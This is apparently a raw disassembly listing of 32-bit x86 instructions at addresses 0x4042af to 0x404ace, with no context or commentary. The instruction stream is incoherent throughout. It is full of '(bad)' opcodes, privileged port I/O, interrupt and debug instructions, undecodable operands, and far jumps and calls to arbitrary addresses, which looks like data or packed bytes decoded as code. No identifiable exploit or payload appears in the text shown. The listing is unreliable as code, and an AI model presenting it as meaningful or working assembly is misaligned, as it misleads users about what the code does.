  4042af:	push   eax
  4042b0:	inc    edx
  4042b1:	outs   dx,DWORD PTR ds:[esi]
  4042b2:	mov    bl,0x6e
  4042b4:	pop    edx
  4042b5:	scas   al,BYTE PTR es:[edi]
  4042b6:	loope  0x404273
  4042b8:	push   ds
  4042b9:	sub    DWORD PTR [edx],esi
  4042bb:	or     eax,0xc01ecbd4
  4042c0:	jmp    0x54152cee
  4042c5:	xchg   DWORD PTR [ebx-0x52935f1c],eax
  4042cb:	cli    
  4042cc:	ret    
  4042cd:	sub    eax,0x6455dadd
  4042d2:	inc    ecx
  4042d3:	mov    fs,WORD PTR [esi]
  4042d5:	out    0x52,al
  4042d7:	int    0x26
  4042d9:	das    
  4042da:	ror    ebx,1
  4042dc:	shl    ebp,cl
  4042de:	xor    eax,0x27a1528d
  4042e3:	push   0xffffffd6
  4042e5:	xlat   BYTE PTR ds:[ebx]
  4042e6:	mov    WORD PTR ds:0x623c7790,ss
  4042ec:	mov    esi,ebx
  4042ee:	pop    DWORD PTR [edx]
  4042f0:	cmc    
  4042f1:	ins    BYTE PTR es:[edi],dx
  4042f2:	mov    bh,0x91
  4042f4:	sbb    ebp,DWORD PTR [esi-0x81b0fcf]
  4042fa:	jmp    0x404288
  4042fc:	es clc 
  4042fe:	pop    ss
  4042ff:	and    eax,0x7aafeac4
  404304:	add    al,0xd7
  404306:	mov    eax,ds:0x48ee822e
  40430b:	pop    esi
  40430c:	in     eax,dx
  40430d:	imul   BYTE PTR [ecx+edx*4-0xd2d44e9]
  404314:	mov    al,0xf6
  404316:	pop    ebx
  404317:	icebp  
  404318:	neg    DWORD PTR [edi-0x19]
  40431b:	test   eax,0x956d7427
  404320:	leave  
  404321:	pusha  
  404322:	fstp   QWORD PTR [edi+0x46]
  404325:	lea    esp,[edx+0x43]
  404328:	mov    ds:0x9557f15e,eax
  40432d:	pushf  
  40432e:	enter  0xbc53,0x12
  404332:	ins    BYTE PTR es:[edi],dx
  404333:	lea    esi,[ebx+esi*8+0x3b92714b]
  40433a:	les    ebx,FWORD PTR [esi]
  40433c:	addr16 ds test al,0xeb
  404340:	fwait
  404341:	aam    0x67
  404343:	clc    
  404344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404346:	in     eax,0x9c
  404348:	jmp    edi
  40434a:	dec    edx
  40434b:	shr    BYTE PTR [esi+0x5e],0x51
  40434f:	adc    ch,BYTE PTR [esi]
  404351:	les    edx,FWORD PTR [edi-0x3e]
  404354:	push   ebx
  404355:	loop   0x4042dc
  404357:	nop
  404358:	add    eax,0xe81223c6
  40435d:	sub    eax,0x76488a3e
  404362:	inc    esi
  404363:	pop    edx
  404364:	dec    edi
  404365:	je     0x404368
  404367:	test   eax,0xd8461298
  40436c:	mov    ebp,0x2492470e
  404371:	imul   eax,edi,0x9d998513
  404377:	lock mov eax,ds:0x1a4619cb
  40437d:	push   cs
  40437e:	bound  ebp,QWORD PTR ds:0x2fd0c482
  404384:	mov    ebx,0x2846d72d
  404389:	ret    0xc228
  40438c:	jb     0x404322
  40438e:	and    al,0xe3
  404390:	retf   0xc194
  404393:	or     BYTE PTR [edx+ebx*4],al
  404396:	aas    
  404397:	fadd   st,st(0)
  404399:	xor    ebx,DWORD PTR [edx+0x56e2b578]
  40439f:	sbb    eax,0x28a18980
  4043a4:	push   ebp
  4043a5:	jecxz  0x404387
  4043a7:	add    eax,0xc64db816
  4043ac:	dec    ebx
  4043ad:	push   ds
  4043ae:	mov    eax,0xba29299a
  4043b3:	adc    eax,DWORD PTR [esp+ecx*8+0x67]
  4043b7:	data16 arpl di,dx
  4043ba:	cmp    al,0x41
  4043bc:	sbb    ecx,DWORD PTR [esp+esi*8-0x6c]
  4043c0:	dec    esi
  4043c1:	int3   
  4043c2:	fdiv   DWORD PTR [esi+0x75cb0eda]
  4043c8:	lahf   
  4043c9:	xor    ah,BYTE PTR [ebx*2+0x77735d3c]
  4043d0:	jae    0x404418
  4043d2:	fld    DWORD PTR [ebx-0x7910967c]
  4043d8:	test   al,0x56
  4043da:	jge    0x40444d
  4043dc:	js     0x404440
  4043de:	pop    ebx
  4043df:	repz test ch,al
  4043e2:	sub    DWORD PTR [edx-0x4c32d888],edi
  4043e8:	fld    DWORD PTR ds:[edx-0x209ce1e3]
  4043ef:	pop    ebp
  4043f0:	pushf  
  4043f1:	mov    ds:0x46129faf,al
  4043f6:	adc    DWORD PTR [ecx+edi*2+0x8747eae],esi
  4043fd:	cmp    edi,esi
  4043ff:	scas   al,BYTE PTR es:[edi]
  404400:	out    0xe,eax
  404402:	aas    
  404403:	outs   dx,DWORD PTR ds:[esi]
  404404:	or     dl,bl
  404406:	mov    ah,0x78
  404408:	pop    ebp
  404409:	adc    al,0xf1
  40440b:	arpl   WORD PTR [eax],si
  40440d:	push   ebx
  40440e:	xchg   esp,eax
  40440f:	push   es
  404410:	ret    0x2cc9
  404413:	ds xchg ecx,eax
  404415:	shr    BYTE PTR [eax],0x58
  404418:	popa   
  404419:	push   esp
  40441a:	and    BYTE PTR [esi+0x18065],ch
  404420:	mov    cl,BYTE PTR [ecx+0x31c92782]
  404426:	cmp    al,0x33
  404428:	outs   dx,DWORD PTR ds:[esi]
  404429:	pop    es
  40442a:	leave  
  40442b:	gs jg  0x404488
  40442e:	push   ecx
  40442f:	adc    ch,BYTE PTR [edi-0x5c]
  404432:	dec    ebp
  404433:	std    
  404434:	cmp    DWORD PTR [edx-0x7ff4dfa8],ecx
  40443a:	push   ss
  40443b:	xlat   BYTE PTR ds:[ebx]
  40443c:	mov    bl,dh
  40443e:	jecxz  0x404466
  404440:	push   edx
  404441:	enter  0x56ca,0x10
  404445:	das    
  404446:	xor    BYTE PTR [edx],cl
  404448:	aam    0x50
  40444a:	in     al,dx
  40444b:	push   eax
  40444c:	pushw  ss
  40444e:	add    ch,BYTE PTR [edi+edi*8+0x1f]
  404452:	popf   
  404453:	sub    dl,ch
  404455:	shr    BYTE PTR [edi],0xab
  404458:	dec    eax
  404459:	dec    eax
  40445a:	popf   
  40445b:	rcl    bl,1
  40445d:	xchg   esi,edx
  40445f:	sbb    BYTE PTR [eax-0x41192883],bh
  404465:	push   ss
  404466:	pop    edi
  404467:	sub    dl,BYTE PTR [eax]
  404469:	out    0x7,al
  40446b:	or     eax,0x54a74ba1
  404470:	sub    DWORD PTR [ebx+0x60],0x2a
  404474:	leave  
  404475:	sub    edi,DWORD PTR [ebx]
  404477:	sti    
  404478:	imul   esi,DWORD PTR [esi+esi*2-0x42f1a793],0x99885806
  404483:	sub    al,0x71
  404485:	es in  al,0x62
  404488:	inc    ebp
  404489:	sub    al,0xa2
  40448b:	push   edi
  40448c:	mov    edi,edx
  40448e:	jb     0x40441c
  404490:	cs (bad) 
  404492:	cld    
  404493:	out    0xb5,al
  404495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404496:	fldcw  WORD PTR [esi-0x15dda72d]
  40449c:	push   esi
  40449d:	adc    eax,edx
  40449f:	inc    edi
  4044a0:	mov    al,ds:0xb5ec5329
  4044a5:	test   DWORD PTR [esi],0x712087c2
  4044ab:	and    eax,0x142f7644
  4044b0:	mov    ebp,0x8d1be752
  4044b5:	cmp    BYTE PTR [edx+ecx*2],bh
  4044b8:	in     eax,0x10
  4044ba:	or     ah,dl
  4044bc:	and    eax,ecx
  4044be:	and    DWORD PTR [ebp-0x6b7f9c61],edx
  4044c4:	scas   al,BYTE PTR es:[edi]
  4044c5:	ret    0x1991
  4044c8:	sub    eax,0x1a889319
  4044cd:	and    BYTE PTR [eax+esi*8-0x26],dh
  4044d1:	scas   al,BYTE PTR es:[edi]
  4044d2:	xor    eax,0x73ff1171
  4044d7:	pop    ebx
  4044d8:	lea    ebp,[edx]
  4044da:	int    0xe2
  4044dc:	mov    ebp,0xb894a4f8
  4044e1:	xchg   edx,eax
  4044e2:	jbe    0x4044f3
  4044e4:	out    dx,al
  4044e5:	sbb    ah,al
  4044e7:	sbb    bl,BYTE PTR [esi+0x3e1b5666]
  4044ed:	ja     0x4044df
  4044ef:	mov    bh,0xe1
  4044f1:	cmp    al,0x6
  4044f3:	ret    0xe1e
  4044f6:	fisubr WORD PTR [esi+0x23]
  4044f9:	xchg   BYTE PTR [esi],ch
  4044fb:	in     eax,0xaa
  4044fd:	inc    bl
  4044ff:	sub    ebx,edx
  404501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404502:	jecxz  0x4044cc
  404504:	pusha  
  404505:	dec    edx
  404506:	not    BYTE PTR [esp+edi*1]
  404509:	daa    
  40450a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40450b:	popf   
  40450c:	mov    edi,0x23825145
  404511:	dec    ebx
  404512:	int3   
  404513:	fwait
  404514:	cwde   
  404515:	imul   edi,DWORD PTR [esi+0x45],0x480816ee
  40451c:	stos   BYTE PTR es:[edi],al
  40451d:	cmp    ah,ch
  40451f:	inc    eax
  404520:	popf   
  404521:	or     esp,DWORD PTR [ebp-0x393fb42b]
  404527:	dec    edi
  404528:	xor    ebx,esi
  40452a:	and    esp,eax
  40452c:	push   0x8696475b
  404531:	push   cs
  404532:	out    dx,al
  404533:	add    DWORD PTR [esi-0x43a27f47],esp
  404539:	mov    bl,0x5d
  40453b:	stos   BYTE PTR es:[edi],al
  40453c:	(bad)  
  40453d:	int3   
  40453e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40453f:	inc    edi
  404540:	(bad)  
  404541:	or     al,0x97
  404543:	cmp    BYTE PTR [eax+0x7e],bh
  404546:	cmp    al,0xdd
  404548:	test   eax,0x516b831f
  40454d:	scas   eax,DWORD PTR es:[edi]
  40454e:	adc    eax,0x5af16045
  404553:	xchg   ecx,eax
  404554:	ret    0x336a
  404557:	(bad)  
  404558:	out    dx,eax
  404559:	or     eax,0x419fd35c
  40455e:	xor    al,0x9b
  404560:	int3   
  404561:	mov    edi,0x5a28e188
  404566:	mov    edx,0xd6ede318
  40456b:	idiv   BYTE PTR [eax-0xf]
  40456e:	mov    dh,0xb3
  404570:	adc    BYTE PTR [edx-0x7a],al
  404573:	daa    
  404574:	xchg   ebx,eax
  404575:	cmp    ah,BYTE PTR [edx+0x68c3be4d]
  40457b:	test   DWORD PTR [edi-0x72],0x3491977a
  404582:	cmp    eax,0x55f85582
  404587:	pusha  
  404588:	mov    ebx,0x3b02a2f7
  40458d:	adc    DWORD PTR [ebx-0x5eb59361],edx
  404593:	xchg   edi,eax
  404594:	es xchg al,bh
  404597:	add    bh,bh
  404599:	imul   edx,eax,0x1e
  40459c:	jbe    0x4045eb
  40459e:	jb     0x4045b1
  4045a0:	test   eax,0x39b00c6e
  4045a5:	sub    DWORD PTR [ebx-0x12e98f3f],ebx
  4045ab:	add    al,0xeb
  4045ad:	push   eax
  4045ae:	iret   
  4045af:	test   DWORD PTR [esi+0x50dc3678],ebx
  4045b5:	jp     0x404584
  4045b7:	mov    gs,esp
  4045b9:	loopne 0x4045a2
  4045bb:	push   0xffffffe1
  4045bd:	jg     0x404547
  4045bf:	arpl   WORD PTR [ecx],ax
  4045c1:	xor    al,0x1c
  4045c3:	stc    
  4045c4:	rcr    ebp,0xf0
  4045c7:	mov    ds:0x7b92c728,eax
  4045cc:	mov    ecx,0x59f80041
  4045d1:	jmp    0x4045aa
  4045d3:	push   edx
  4045d4:	xor    ah,BYTE PTR [eax]
  4045d6:	pop    ecx
  4045d7:	int    0x53
  4045d9:	ds xchg edi,eax
  4045db:	mov    BYTE PTR [edx-0x7],0x35
  4045df:	inc    esp
  4045e0:	loop   0x4045f7
  4045e2:	or     al,0xf2
  4045e4:	lock push edi
  4045e6:	and    ah,bh
  4045e8:	or     BYTE PTR [esi],ch
  4045ea:	cwde   
  4045eb:	stos   DWORD PTR es:[edi],eax
  4045ec:	fidiv  WORD PTR [ebp+0x0]
  4045ef:	lods   al,BYTE PTR ds:[esi]
  4045f0:	pop    ss
  4045f1:	les    ebx,FWORD PTR [edi]
  4045f3:	or     ebx,DWORD PTR [ebx+0x41]
  4045f6:	in     eax,0x40
  4045f8:	ja     0x404618
  4045fa:	dec    esp
  4045fb:	push   ecx
  4045fc:	mov    ds:0xf2ca3275,al
  404601:	dec    edi
  404602:	repnz adc bh,BYTE PTR [ebp+0x2c]
  404606:	adc    edx,DWORD PTR [ecx]
  404608:	sub    eax,ebp
  40460a:	test   DWORD PTR [esi+0x660d8595],eax
  404610:	dec    eax
  404611:	push   edi
  404612:	xlat   BYTE PTR ds:[ebx]
  404613:	jg     0x4045aa
  404615:	xlat   BYTE PTR ds:[ebx]
  404616:	rcr    BYTE PTR [eax-0x1378683b],cl
  40461c:	popf   
  40461d:	into   
  40461e:	repnz add edx,DWORD PTR [eax]
  404621:	mov    al,ds:0x4a95c8de
  404626:	adc    eax,DWORD PTR [eax+ecx*8]
  404629:	(bad)  
  40462a:	(bad)  
  40462b:	xor    BYTE PTR [edi+0xe8f108e],ah
  404631:	mov    al,0x5e
  404633:	retf   
  404634:	mov    dl,0x63
  404636:	enter  0x5583,0x93
  40463a:	jmp    0x4046a0
  40463c:	inc    esi
  40463d:	shl    DWORD PTR [esp+esi*2+0x47f4913e],cl
  404644:	mov    al,ds:0x6c0434ed
  404649:	mov    ds:0x5d3e2576,eax
  40464e:	xor    BYTE PTR [edx-0x6de7448c],cl
  404654:	mov    esp,0x6689b009
  404659:	lea    ecx,[eax+0x16]
  40465c:	add    dh,BYTE PTR [ebx-0x35010c49]
  404662:	loopne 0x404677
  404664:	test   eax,0x9d8ee243
  404669:	ficomp DWORD PTR [ebx]
  40466b:	std    
  40466c:	pop    edi
  40466d:	add    al,0x6f
  40466f:	cmp    ah,BYTE PTR [edi]
  404671:	sti    
  404672:	jp     0x404689
  404674:	xchg   esp,eax
  404675:	jae    0x404637
  404677:	repz sub eax,0x5742a64e
  40467d:	fiadd  WORD PTR [ebx-0x501e6ea3]
  404683:	pushf  
  404684:	in     al,dx
  404685:	fwait
  404686:	dec    edx
  404687:	sub    ch,BYTE PTR [ecx]
  404689:	push   0x28
  40468b:	pop    esp
  40468c:	mov    esi,gs
  40468e:	mov    DWORD PTR [eax],0x48602f34
  404694:	sub    dh,dl
  404696:	adc    eax,0xfef52749
  40469b:	fistp  DWORD PTR [esi]
  40469d:	pushf  
  40469e:	xor    DWORD PTR [edi+ecx*4+0x26d1c325],0xec8b8542
  4046a9:	and    ebp,esp
  4046ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046ac:	and    bl,BYTE PTR [edx+edi*8]
  4046af:	in     eax,dx
  4046b0:	mov    cl,0x3f
  4046b2:	pop    ecx
  4046b3:	pushf  
  4046b4:	jmp    0x40468a
  4046b6:	repnz inc esi
  4046b8:	pop    eax
  4046b9:	sub    BYTE PTR [ebx],dh
  4046bb:	mov    al,0xa6
  4046bd:	(bad)  
  4046be:	js     0x404720
  4046c0:	(bad)  
  4046c1:	push   0x93043eef
  4046c6:	rcl    BYTE PTR [ecx+0x53ef1757],1
  4046cc:	sbb    eax,0x3f670129
  4046d1:	mov    ebx,?
  4046d3:	outs   dx,BYTE PTR ds:[esi]
  4046d4:	test   al,0x14
  4046d6:	adc    bl,dh
  4046d8:	iret   
  4046d9:	repnz rol DWORD PTR [esi+0x76],1
  4046dd:	lods   al,BYTE PTR ds:[esi]
  4046de:	jns    0x4046d8
  4046e0:	loop   0x404703
  4046e2:	mov    bh,0x88
  4046e4:	data16 jnp 0x4046ff
  4046e7:	bound  edx,QWORD PTR [esi+0x4e]
  4046ea:	pop    ebx
  4046eb:	call   FWORD PTR ds:0x3df12ba1
  4046f1:	sbb    BYTE PTR [ebx+0x71],bh
  4046f4:	std    
  4046f5:	mov    BYTE PTR [ebp+0x4c6c15cd],0xa8
  4046fc:	mov    bh,0xce
  4046fe:	jp     0x4046f1
  404700:	jge    0x4046c8
  404702:	cdq    
  404703:	jmp    0x5b6605ea
  404708:	dec    esp
  404709:	or     al,0xf
  40470b:	ror    DWORD PTR [eax+0x2a],0x2d
  40470f:	rol    BYTE PTR [edx-0x7d6ce918],0xd5
  404716:	or     DWORD PTR [ebx],ebp
  404718:	cmp    al,ah
  40471a:	int    0x68
  40471c:	mov    al,ds:0x61cf7a7b
  404721:	sub    DWORD PTR [ecx],0x1d
  404724:	and    BYTE PTR ds:0x653014da,dl
  40472a:	adc    eax,0x9588a446
  40472f:	mov    bh,ch
  404731:	sti    
  404732:	or     BYTE PTR [esi],0xa
  404735:	jnp    0x4046ff
  404737:	ret    0xb980
  40473a:	retf   0x7413
  40473d:	sub    edi,edi
  40473f:	jo     0x4046c7
  404741:	jmp    0x72df2596
  404746:	sub    dh,al
  404748:	(bad)  
  404749:	mov    eax,0xcc84d916
  40474e:	and    ah,BYTE PTR [edx-0x63d45757]
  404754:	adc    ah,BYTE PTR [ebx+0x2c8423da]
  40475a:	shr    DWORD PTR [esi],1
  40475c:	iret   
  40475d:	jle    0x4046ff
  40475f:	int    0x32
  404761:	dec    ecx
  404762:	retf   
  404763:	bndstx [edi-0x5b640804],(bad)
  40476a:	mov    edx,0x35d59306
  40476f:	cmp    eax,esi
  404771:	sbb    al,0xe0
  404773:	(bad)  
  404774:	sub    BYTE PTR [ebx],cl
  404776:	sbb    bl,ah
  404778:	(bad)  
  404779:	loopne 0x4047f1
  40477b:	popf   
  40477c:	pop    ds
  40477d:	xchg   edi,eax
  40477e:	push   esi
  40477f:	fsubr  QWORD PTR [edi+0x66]
  404782:	pop    edx
  404783:	scas   al,BYTE PTR es:[edi]
  404784:	xchg   edi,eax
  404785:	add    eax,0x1ba8a86c
  40478a:	retf   
  40478b:	push   esi
  40478c:	sub    DWORD PTR [edi],0xffffffff
  40478f:	into   
  404790:	mov    bh,0xfc
  404792:	out    dx,eax
  404793:	in     eax,dx
  404794:	ins    BYTE PTR es:[edi],dx
  404795:	jmp    0x8599:0xbc8ac146
  40479c:	sbb    BYTE PTR [eax-0x1b9a7e91],dh
  4047a2:	xchg   ebp,eax
  4047a3:	xor    cl,al
  4047a5:	xor    BYTE PTR [esi+0x20],bl
  4047a8:	or     eax,0x71e204f
  4047ad:	sub    DWORD PTR [esi+0x4d085ef6],esi
  4047b3:	mov    ecx,0xef4bbf65
  4047b8:	out    0x68,al
  4047ba:	inc    edi
  4047bb:	cmp    ah,BYTE PTR [edx+0x1773ea47]
  4047c1:	sub    BYTE PTR es:[eax+0xb38992],dh
  4047c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c9:	mov    ch,BYTE PTR [ebx+edx*1+0x2b4e898d]
  4047d0:	dec    ebx
  4047d1:	fdivp  st(5),st
  4047d3:	ret    
  4047d4:	cdq    
  4047d5:	enter  0xf6ae,0xc
  4047d9:	shr    BYTE PTR [ecx],cl
  4047db:	inc    esp
  4047dc:	or     BYTE PTR [eax+0x630512d0],bh
  4047e2:	(bad)  
  4047e3:	push   ebp
  4047e4:	outs   dx,BYTE PTR ds:[esi]
  4047e5:	dec    eax
  4047e6:	paddw  mm2,QWORD PTR [eax]
  4047e9:	(bad)  
  4047ea:	push   ss
  4047eb:	ror    BYTE PTR [esi+0x16],cl
  4047ee:	push   esi
  4047ef:	or     eax,0x2004bc40
  4047f4:	push   edi
  4047f5:	jo     0x404814
  4047f7:	psubusw mm2,QWORD PTR [ecx+0x25088696]
  4047fe:	add    al,0x21
  404800:	adc    DWORD PTR [esi],0xffffffe3
  404803:	test   eax,0xf4f37eb0
  404808:	in     eax,0x68
  40480a:	jne    0x404839
  40480c:	dec    esp
  40480d:	push   edi
  40480e:	int3   
  40480f:	add    dh,cl
  404811:	inc    edi
  404812:	and    eax,edx
  404814:	fs cli 
  404816:	lds    esi,FWORD PTR [ebp-0x7]
  404819:	or     dh,dh
  40481b:	outs   dx,DWORD PTR ds:[esi]
  40481c:	pop    es
  40481d:	mov    edx,0x7741e820
  404822:	jo     0x40486d
  404824:	sub    esp,edx
  404826:	sbb    BYTE PTR [ebx-0x60e484cc],al
  40482c:	cdq    
  40482d:	cwde   
  40482e:	arpl   WORD PTR [ebp-0x7],di
  404831:	je     0x404861
  404833:	dec    esp
  404834:	cmp    eax,0x23005207
  404839:	xchg   dl,ah
  40483b:	mov    ds:0xcad8bc9a,al
  404840:	adc    al,0x1
  404842:	jne    0x4048b2
  404844:	mov    bl,0x1a
  404846:	ror    BYTE PTR [ebp+0x77],cl
  404849:	aad    0x91
  40484b:	cmp    BYTE PTR [ebp+0x31],ch
  40484e:	mov    BYTE PTR [ebp+0x6],bh
  404851:	sub    al,0x33
  404853:	xor    al,0x5a
  404855:	inc    esp
  404856:	add    BYTE PTR [ebp+0x74558127],al
  40485c:	in     eax,dx
  40485d:	xchg   ebx,eax
  40485e:	inc    eax
  40485f:	lods   al,BYTE PTR ds:[esi]
  404860:	dec    eax
  404861:	mov    cl,0x59
  404863:	mov    ah,0x71
  404865:	mov    ds:0x7a459eb7,eax
  40486a:	fistp  DWORD PTR [ecx-0x1b]
  40486d:	repz mov ch,0x5
  404870:	mov    esp,0xc150b931
  404875:	cdq    
  404876:	pop    edx
  404877:	mov    bh,0x34
  404879:	mov    ebp,0x1ae53af2
  40487e:	cmp    al,0x8a
  404880:	mov    al,0xea
  404882:	cmp    eax,0xbbd4f82c
  404887:	cmp    ebp,DWORD PTR [ecx+0x5d]
  40488a:	inc    ebx
  40488b:	(bad)  
  40488c:	mov    edi,0x8361c528
  404891:	gs je  0x4048da
  404894:	icebp  
  404895:	xor    edi,ecx
  404897:	or     edi,DWORD PTR es:[eax]
  40489a:	add    BYTE PTR [ebx+ebp*4-0x3e],dl
  40489e:	popa   
  40489f:	out    0x7a,al
  4048a1:	dec    edx
  4048a2:	sub    dh,BYTE PTR [ecx-0x5fb2882]
  4048a8:	stc    
  4048a9:	mov    DWORD PTR [esi+edx*4],esi
  4048ac:	shl    BYTE PTR [edi-0x24],1
  4048af:	jmp    0xab57:0xb76b1644
  4048b6:	mov    esi,0x56bd22a5
  4048bb:	xchg   ebx,eax
  4048bc:	fisubr DWORD PTR [eax+eiz*8+0x25]
  4048c0:	retf   
  4048c1:	xchg   esp,eax
  4048c2:	or     eax,0x3f5fe077
  4048c7:	popf   
  4048c8:	push   ecx
  4048c9:	fwait
  4048ca:	add    esi,DWORD PTR [edx-0x3e]
  4048cd:	fs aas 
  4048cf:	leave  
  4048d0:	mov    bh,0x5d
  4048d2:	jns    0x404865
  4048d4:	adc    al,ch
  4048d6:	or     al,0xae
  4048d8:	rol    ah,1
  4048da:	or     eax,0xc85008c9
  4048df:	cmp    esi,DWORD PTR [ecx-0x1c]
  4048e2:	cmp    BYTE PTR [ecx],cl
  4048e4:	sahf   
  4048e5:	jns    0x404909
  4048e7:	call   0x778d7b09
  4048ec:	push   ds
  4048ed:	in     al,dx
  4048ee:	or     al,0xdf
  4048f0:	adc    BYTE PTR [ebp+0x37],bl
  4048f3:	dec    eax
  4048f4:	dec    ebx
  4048f5:	jnp    0x404936
  4048f7:	call   0x600084b
  4048fc:	xchg   ebx,eax
  4048fd:	fwait
  4048fe:	ret    
  4048ff:	adc    dh,dl
  404901:	shr    BYTE PTR [edi-0x2de1a4be],1
  404907:	cmp    dh,BYTE PTR [esi-0x6b176a5e]
  40490d:	inc    ebp
  40490e:	das    
  40490f:	xor    DWORD PTR [edi],0x27
  404912:	mov    ebp,0xaf84b5be
  404917:	and    eax,0x20ec9c3e
  40491c:	loop   0x4048cb
  40491e:	(bad)  
  40491f:	call   0x4f39:0x7db3c7f
  404926:	add    ebx,DWORD PTR [ebp+eiz*1-0x46cadfe5]
  40492d:	rcl    esi,1
  40492f:	ret    
  404930:	mov    bh,cl
  404932:	cld    
  404933:	mov    esi,0x1b89ab78
  404938:	lea    edi,[ebx-0x1f021bcf]
  40493e:	scas   al,BYTE PTR es:[edi]
  40493f:	fcomp  DWORD PTR [ecx]
  404941:	jle    0x40495c
  404943:	xchg   ebp,eax
  404944:	push   ebx
  404945:	enter  0x2037,0x6d
  404949:	mov    esp,0xc30446ad
  40494e:	add    DWORD PTR [eax],eax
  404950:	and    BYTE PTR [edi+0x36],cl
  404953:	adc    dl,BYTE PTR [ebx+eiz*2+0x2569c1f6]
  40495a:	inc    esp
  40495b:	int    0x97
  40495d:	dec    edx
  40495e:	call   0x547f:0xc764f27
  404965:	arpl   di,bp
  404967:	ret    0x5881
  40496a:	push   ds
  40496b:	mov    dh,al
  40496d:	lock imul edi,DWORD PTR [ebp-0x4c],0x437f7d71
  404975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404976:	xchg   edi,eax
  404977:	sbb    DWORD PTR [edi+0x795ebf9a],0xfffffff8
  40497e:	call   0x4eb8:0x4ed8105d
  404985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404986:	adc    esp,DWORD PTR ds:0xd069ad1
  40498c:	rcl    DWORD PTR [ebx-0x44],1
  40498f:	aam    0xf6
  404991:	sbb    eax,0x5fa7884
  404996:	push   edi
  404997:	mov    esp,0x4951b47a
  40499c:	push   ecx
  40499d:	xor    DWORD PTR [ecx+0x16],esi
  4049a0:	dec    edx
  4049a1:	faddp  st(7),st
  4049a3:	sti    
  4049a4:	or     eax,0x22d6c384
  4049a9:	rcr    ch,1
  4049ab:	cmc    
  4049ac:	inc    edi
  4049ad:	(bad)  [edx-0x2aa64d27]
  4049b3:	jge    0x4049ab
  4049b5:	sbb    ebx,ebp
  4049b7:	add    eax,0xcc09e3ce
  4049bc:	or     al,0x98
  4049be:	icebp  
  4049bf:	loopne 0x404a07
  4049c1:	idiv   DWORD PTR [edx+0x4c]
  4049c4:	xor    ebx,DWORD PTR [eax+ebx*4+0x30b9811f]
  4049cb:	shr    BYTE PTR [eax-0x17],cl
  4049ce:	xchg   esi,eax
  4049cf:	mov    ah,ah
  4049d1:	mov    WORD PTR fs:[eax-0x5c09a563],?
  4049d8:	push   ebp
  4049d9:	in     eax,dx
  4049da:	xor    ebp,esi
  4049dc:	xor    ch,BYTE PTR [ecx]
  4049de:	jae    0x4049c3
  4049e0:	sbb    ch,BYTE PTR [esi]
  4049e2:	sbb    eax,0x1d17a933
  4049e7:	rol    BYTE PTR [eax-0x1e9cd2a9],1
  4049ed:	iret   
  4049ee:	call   0xde042ef1
  4049f3:	inc    BYTE PTR [edi]
  4049f5:	inc    esp
  4049f6:	cmp    eax,DWORD PTR [edx]
  4049f8:	retf   
  4049f9:	xchg   ecx,eax
  4049fa:	(bad)  
  4049fb:	frstor [ecx+0x27]
  4049fe:	mov    ds:0x504f6c12,al
  404a03:	push   ss
  404a04:	outs   dx,BYTE PTR ds:[esi]
  404a05:	popa   
  404a06:	pop    es
  404a07:	jb     0x4049ca
  404a09:	scas   eax,DWORD PTR es:[edi]
  404a0a:	sbb    ecx,DWORD PTR [ecx+0x6e]
  404a0d:	xor    eax,DWORD PTR [ebx+0x34]
  404a10:	jle    0x404a67
  404a12:	mov    bl,0x25
  404a14:	push   ds
  404a15:	add    eax,0xae567fe3
  404a1a:	ja     0x4049b1
  404a1c:	mov    cl,0x76
  404a1e:	sbb    ebx,esp
  404a20:	iret   
  404a21:	es retf 0x71f0
  404a25:	ret    
  404a26:	cli    
  404a27:	sbb    dh,ah
  404a29:	imul   edi,ecx,0x9
  404a2c:	push   edi
  404a2d:	inc    edi
  404a2e:	and    DWORD PTR [ebx-0x54e9c0c5],ebx
  404a34:	dec    edx
  404a35:	aad    0x2b
  404a37:	iret   
  404a38:	adc    cl,ch
  404a3a:	sub    eax,0x7c9401c8
  404a3f:	adc    BYTE PTR [eax+0x61],ah
  404a42:	das    
  404a43:	inc    edx
  404a44:	test   DWORD PTR [ebp-0x4751524],ecx
  404a4a:	sbb    esp,DWORD PTR [ebx+0x137183ad]
  404a50:	stos   BYTE PTR es:[edi],al
  404a51:	das    
  404a52:	jp     0xdba163f5
  404a58:	pusha  
  404a59:	sub    DWORD PTR [ebp+0x34],ecx
  404a5c:	lahf   
  404a5d:	mov    ?,ecx
  404a5f:	add    ch,ah
  404a61:	pushf  
  404a62:	push   ecx
  404a63:	jnp    0x404a18
  404a65:	jns    0x404a02
  404a67:	into   
  404a68:	out    0x59,al
  404a6a:	mov    DWORD PTR [edx+0x4],ebp
  404a6d:	adc    DWORD PTR [edx-0x2],edi
  404a70:	push   esp
  404a71:	or     BYTE PTR [esi],ah
  404a73:	mov    esp,0x7fbe18e3
  404a78:	std    
  404a79:	sub    al,0x65
  404a7b:	cmc    
  404a7c:	push   es
  404a7d:	loopne 0x404a38
  404a7f:	(bad)  
  404a80:	nop
  404a81:	dec    eax
  404a82:	pop    ebp
  404a83:	dec    eax
  404a84:	mov    ecx,0x1ae1d78e
  404a89:	mov    bh,0xed
  404a8b:	jmp    0x942dc9c4
  404a90:	inc    ebp
  404a91:	sar    al,0x1c
  404a94:	out    dx,al
  404a95:	in     eax,0xa
  404a97:	enter  0x760a,0xd
  404a9b:	aad    0x81
  404a9d:	div    BYTE PTR [eax+ecx*1+0x27]
  404aa1:	pop    esp
  404aa2:	addps  xmm6,xmm6
  404aa5:	mov    dl,0xfd
  404aa7:	jne    0x404ab8
  404aa9:	or     al,0x46
  404aab:	xor    eax,0xd3395dd4
  404ab0:	dec    eax
  404ab1:	outs   dx,DWORD PTR ds:[esi]
  404ab2:	int3   
  404ab3:	pop    esi
  404ab4:	sub    BYTE PTR ds:0x707dff06,dl
  404aba:	aad    0xb2
  404abc:	ret    0x4261
  404abf:	mov    ch,al
  404ac1:	dec    ebx
  404ac2:	mov    ecx,0x649a1c10
  404ac7:	and    eax,0xdf23d2c7
  404acc:	ffreep st(4)
  404ace:	inc    edx
